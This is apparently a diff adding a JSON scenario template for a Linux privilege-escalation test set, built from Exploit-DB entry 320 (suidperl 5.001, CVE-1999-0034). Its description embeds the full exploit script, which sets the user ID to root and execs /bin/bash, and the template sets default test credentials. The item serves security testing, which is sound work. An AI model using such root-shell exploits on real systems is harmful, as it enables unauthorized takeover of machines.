@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_320",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: suid_perl 5.001 - Command Execution (OSVDB-10870;CVE-1999-0034)\n\nExploit source code (320.pl):\n```\n#!/usr/bin/suidperl -U\n$ENV{PATH}=\"/bin:/usr/bin\";\n$>=0;$<=0;\nexec(\"/bin/bash\");\n\n\n# milw0rm.com [1996-06-01]\n```",
+  "cve": "OSVDB-10870;CVE-1999-0034",
+  "exploitdb_id": "320",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_320",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
